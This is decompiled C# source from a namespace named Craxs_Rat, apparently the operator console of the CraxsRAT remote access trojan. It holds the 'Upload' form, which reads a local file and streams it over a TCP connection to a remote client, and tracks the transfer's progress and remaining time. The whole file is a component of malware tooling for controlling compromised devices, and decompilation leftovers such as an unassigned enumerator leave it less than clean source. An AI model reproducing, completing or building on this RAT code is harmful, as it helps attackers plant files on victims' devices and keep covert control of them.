using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x02000110 RID: 272
	[DesignerGenerated]
	public partial class Upload : Form
	{
		// Token: 0x06001326 RID: 4902 RVA: 0x000CFCEC File Offset: 0x000CDEEC
		public Upload()
		{
			base.Load += this.Upload_Load;
			base.Closing += this.Upload_Closing;
			this.fileStream_0 = null;
			this.long_0 = 0L;
			this.long_1 = 0L;
			this.string_0 = "null";
			this.InitializeComponent();
		}

		// Token: 0x17000587 RID: 1415
		// (get) Token: 0x06001329 RID: 4905 RVA: 0x000075C9 File Offset: 0x000057C9
		// (set) Token: 0x0600132A RID: 4906 RVA: 0x000D01CC File Offset: 0x000CE3CC
		internal virtual DataGridView DGV0 { get; set; }

		// Token: 0x17000588 RID: 1416
		// (get) Token: 0x0600132B RID: 4907 RVA: 0x000075D1 File Offset: 0x000057D1
		// (set) Token: 0x0600132C RID: 4908 RVA: 0x000D01E0 File Offset: 0x000CE3E0
		internal virtual ProgressBar ProgressBar1 { get; set; }

		// Token: 0x1700058B RID: 1419
		// (get) Token: 0x0600132D RID: 4909 RVA: 0x000075D9 File Offset: 0x000057D9
		// (set) Token: 0x0600132E RID: 4910 RVA: 0x000D01F4 File Offset: 0x000CE3F4
		internal virtual System.Windows.Forms.Timer TimeFinish
		{
			[CompilerGenerated]
			get
			{
				return this._TimeFinish;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TimeFinish_Tick);
				System.Windows.Forms.Timer timeFinish = this._TimeFinish;
				if (timeFinish != null)
				{
					timeFinish.Tick -= value2;
				}
				this._TimeFinish = value;
				timeFinish = this._TimeFinish;
				if (timeFinish != null)
				{
					timeFinish.Tick += value2;
				}
			}
		}

		// Token: 0x1700058C RID: 1420
		// (get) Token: 0x0600132F RID: 4911 RVA: 0x000075E1 File Offset: 0x000057E1
		// (set) Token: 0x06001330 RID: 4912 RVA: 0x000D0238 File Offset: 0x000CE438
		internal virtual System.Windows.Forms.Timer Progr
		{
			[CompilerGenerated]
			get
			{
				return this._Progr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Progr_Tick);
				System.Windows.Forms.Timer progr = this._Progr;
				if (progr != null)
				{
					progr.Tick -= value2;
				}
				this._Progr = value;
				progr = this._Progr;
				if (progr != null)
				{
					progr.Tick += value2;
				}
			}
		}

		// Token: 0x17000589 RID: 1417
		// (get) Token: 0x06001331 RID: 4913 RVA: 0x000075E9 File Offset: 0x000057E9
		// (set) Token: 0x06001332 RID: 4914 RVA: 0x000D027C File Offset: 0x000CE47C
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x1700058A RID: 1418
		// (get) Token: 0x06001333 RID: 4915 RVA: 0x000075F1 File Offset: 0x000057F1
		// (set) Token: 0x06001334 RID: 4916 RVA: 0x000D0290 File Offset: 0x000CE490
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x1700058D RID: 1421
		// (get) Token: 0x06001335 RID: 4917 RVA: 0x000075F9 File Offset: 0x000057F9
		// (set) Token: 0x06001336 RID: 4918 RVA: 0x000D02A4 File Offset: 0x000CE4A4
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x1700058E RID: 1422
		// (get) Token: 0x06001337 RID: 4919 RVA: 0x00007601 File Offset: 0x00005801
		// (set) Token: 0x06001338 RID: 4920 RVA: 0x000D02E8 File Offset: 0x000CE4E8
		public virtual BackgroundWorker Bgworker
		{
			[CompilerGenerated]
			get
			{
				return this._Bgworker;
			}
			[CompilerGenerated]
			set
			{
				DoWorkEventHandler value2 = new DoWorkEventHandler(this.Bgworker_DoWork);
				BackgroundWorker bgworker = this._Bgworker;
				if (bgworker != null)
				{
					bgworker.DoWork -= value2;
				}
				this._Bgworker = value;
				bgworker = this._Bgworker;
				if (bgworker != null)
				{
					bgworker.DoWork += value2;
				}
			}
		}

		// Token: 0x06001339 RID: 4921 RVA: 0x000D032C File Offset: 0x000CE52C
		private void method_0()
		{
			try
			{
				foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
				{
					dataGridView.BackgroundColor = Module5.color_0;
					dataGridView.BackColor = Module5.color_0;
					dataGridView.ColumnHeadersDefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.SelectionForeColor = Module5.color_0;
					dataGridView.DefaultCellStyle.ForeColor = Module5.White;
					dataGridView.DefaultCellStyle.SelectionBackColor = Module5.White;
					dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = Module5.White;
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x0600133A RID: 4922 RVA: 0x000D03F8 File Offset: 0x000CE5F8
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x0600133B RID: 4923 RVA: 0x000D0440 File Offset: 0x000CE640
		private void Upload_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\16.ico");
			this.method_0();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			this.TimeFinish.Interval = 100;
			this.TimeFinish.Enabled = true;
			if (this.fileStream_0 == null & this.long_0 == 0L)
			{
				this.fileStream_0 = new FileStream(this.strings_0[3], FileMode.Open, FileAccess.Read);
			}
			if (this.Bgworker == null)
			{
				this.Bgworker = new BackgroundWorker();
			}
			if (!this.Bgworker.IsBusy)
			{
				this.Bgworker.RunWorkerAsync();
			}
			else
			{
				if (this.fileStream_0 != null)
				{
					this.fileStream_0.Dispose();
					this.fileStream_0.Close();
				}
				this.gclass8_0.method_6(this.tcpClient_0);
				base.Close();
			}
			this.Progr.Interval = 10;
			this.Progr.Enabled = true;
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x0600133C RID: 4924 RVA: 0x000D0590 File Offset: 0x000CE790
		private void Bgworker_DoWork(object sender, DoWorkEventArgs e)
		{
			byte[] array = new byte[4097];
			if (this.fileStream_0 != null)
			{
				int num;
				do
				{
					num = this.fileStream_0.Read(array, 0, array.Length);
					if (num > 0)
					{
						checked
						{
							try
							{
								if (this.tcpClient_0.Client.Connected)
								{
									this.tcpClient_0.Client.Poll(Module3.int_1, SelectMode.SelectWrite);
									this.tcpClient_0.Client.SendBufferSize = array.Length;
									this.tcpClient_0.GetStream().Write(array, 0, num);
									ref long ptr = ref this.long_1;
									this.long_1 = ptr + unchecked((long)num);
									ptr = ref this.long_0;
									this.long_0 = ptr + unchecked((long)array.Length);
									GClass7 gclass7_ = this.gclass8_0.gclass7_0;
									ptr = ref gclass7_.long_0;
									gclass7_.long_0 = ptr + unchecked((long)array.Length);
								}
							}
							catch (Exception ex)
							{
								break;
							}
						}
						if (this.long_0 == (long)Conversions.ToInteger(this.strings_0[1]))
						{
							break;
						}
					}
					Thread.Sleep(1);
				}
				while (num > 0);
			}
			if (this.fileStream_0 != null)
			{
				this.fileStream_0.Dispose();
				this.fileStream_0.Close();
			}
		}

		// Token: 0x0600133D RID: 4925 RVA: 0x000D06CC File Offset: 0x000CE8CC
		private void Upload_Closing(object sender, CancelEventArgs e)
		{
			this.TimeFinish.Enabled = false;
			this.Progr.Enabled = false;
			if (this.gclass8_0 != null)
			{
				this.gclass8_0.bool_2 = true;
				this.gclass8_0.method_6(this.tcpClient_0);
			}
			if (this.fileStream_0 != null)
			{
				this.fileStream_0.Dispose();
				this.fileStream_0.Close();
			}
			if (this.Bgworker != null)
			{
				try
				{
					this.Bgworker.Dispose();
					this.Bgworker.CancelAsync();
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600133E RID: 4926 RVA: 0x000D0780 File Offset: 0x000CE980
		private void TimeFinish_Tick(object sender, EventArgs e)
		{
			if (this.DGV0.Rows.Count > 0)
			{
				if (this.long_1 >= this.long_2)
				{
					base.Close();
				}
				else if (this.long_1 > 0L)
				{
					this.dateTime_1 = DateAndTime.Now;
					this.timeSpan_0 = this.dateTime_1.Subtract(this.dateTime_0);
					long num = checked((long)Math.Round(unchecked((double)(checked(this.long_2 - this.long_1)) * this.timeSpan_0.TotalSeconds) / (double)this.long_1));
					string text = Module2.smethod_22(num);
					if (!text.Equals("0:0:0"))
					{
						DateTime dateTime = DateTime.Now;
						DateTime dateTime2 = Convert.ToDateTime(text);
						dateTime = dateTime.AddHours((double)dateTime2.Hour).AddMinutes((double)dateTime2.Minute).AddSeconds((double)dateTime2.Second);
						this.DGV0.Rows[4].Cells[1].Value = string.Format("[{0}] [{1}]", text, dateTime.ToString("h:mm:ss"));
					}
				}
			}
		}

		// Token: 0x0600133F RID: 4927 RVA: 0x000D08B4 File Offset: 0x000CEAB4
		private void Progr_Tick(object sender, EventArgs e)
		{
			if (this.long_1 != 0L | this.long_1 > (long)this.ProgressBar1.Maximum)
			{
				this.ProgressBar1.Value = checked((int)this.long_1);
			}
		}

		// Token: 0x04000CEF RID: 3311
		public TcpClient tcpClient_0;

		// Token: 0x04000CF0 RID: 3312
		public GClass8 gclass8_0;

		// Token: 0x04000CF1 RID: 3313
		public FileStream fileStream_0;

		// Token: 0x04000CF2 RID: 3314
		public long long_0;

		// Token: 0x04000CF3 RID: 3315
		public long long_1;

		// Token: 0x04000CF4 RID: 3316
		public long long_2;

		// Token: 0x04000CF5 RID: 3317
		public TimeSpan timeSpan_0;

		// Token: 0x04000CF6 RID: 3318
		public DateTime dateTime_0;

		// Token: 0x04000CF7 RID: 3319
		public DateTime dateTime_1;

		// Token: 0x04000CF8 RID: 3320
		public string[] strings_0;

		// Token: 0x04000CF9 RID: 3321
		public string string_0;
	}
}
